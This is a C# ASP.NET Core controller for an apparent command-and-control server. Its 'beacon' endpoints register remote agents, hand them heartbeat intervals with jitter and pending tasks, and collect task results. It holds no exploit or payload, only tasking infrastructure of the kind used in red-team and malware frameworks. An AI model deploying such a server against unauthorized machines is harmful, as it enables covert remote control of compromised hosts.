using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/beacon")]
public class AgentCommsController : ControllerBase
{
    private readonly AgentCommsService _commsService;
    private readonly AgentTrafficService _traffic;

    public AgentCommsController(AgentCommsService commsService, AgentTrafficService traffic)
    {
        _commsService = commsService;
        _traffic = traffic;
    }

    [HttpPost("register")]
    public async Task<IActionResult> Register([FromBody] RegisterRequest request)
    {
        if (string.IsNullOrWhiteSpace(request.Hostname))
            return BadRequest(new { error = "hostname required" });

        var bytesReceived = Request.ContentLength ?? 0;

        var clientIp = HttpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown";
        var agent = await _commsService.HandleRegisterAsync(request, clientIp);

        if (agent == null)
            return StatusCode(500, new { error = "registration failed" });

        var profile = _commsService.GetActiveProfile();
        var response = new
        {
            agent_id = agent.Id,
            heartbeat_url = profile.GetHeartbeatUrl("/api/beacon"),
            result_url = profile.GetResultUrl("/api/beacon"),
            ws_url = profile.GetWebSocketUrl(""),
            heartbeat_interval = profile.HeartbeatIntervalSeconds,
            jitter = profile.JitterPercent
        };

        var responseJson = JsonSerializer.Serialize(response);
        var bytesSent = Encoding.UTF8.GetByteCount(responseJson);
        _traffic.Accumulate(agent.Id, agent.Hostname, bytesReceived, bytesSent);

        return Ok(response);
    }

    [HttpPost("heartbeat")]
    public async Task<IActionResult> Heartbeat([FromBody] object encryptedPayload)
    {
        var agentId = Request.Headers["X-Agent-Id"].FirstOrDefault();
        if (string.IsNullOrEmpty(agentId))
            return BadRequest(new { error = "missing agent id" });

        var bytesReceived = Request.ContentLength ?? 0;
        var (valid, task, hostname) = await _commsService.HandleHeartbeatAsync(agentId);
        if (!valid)
            return NotFound(new { error = "agent not found" });

        var response = new HeartbeatResponse { PendingTask = task };
        var responseJson = System.Text.Json.JsonSerializer.Serialize(response);
        var bytesSent = System.Text.Encoding.UTF8.GetByteCount(responseJson);

        _commsService.RecordTraffic(agentId, hostname, bytesReceived, bytesSent);

        return Ok(response);
    }

    [HttpPost("result")]
    public async Task<IActionResult> SubmitResult([FromBody] TaskResult result)
    {
        var agentId = Request.Headers["X-Agent-Id"].FirstOrDefault();
        if (string.IsNullOrEmpty(agentId))
            return BadRequest(new { error = "missing agent id" });

        var bytesReceived = Request.ContentLength ?? 0;
        var responseJson = System.Text.Json.JsonSerializer.Serialize(new { status = "received" });
        var bytesSent = System.Text.Encoding.UTF8.GetByteCount(responseJson);
        var success = await _commsService.HandleResultAsync(agentId, result, bytesReceived, bytesSent);
        if (!success)
            return NotFound(new { error = "invalid task" });

        return Ok(new { status = "received" });
    }
}
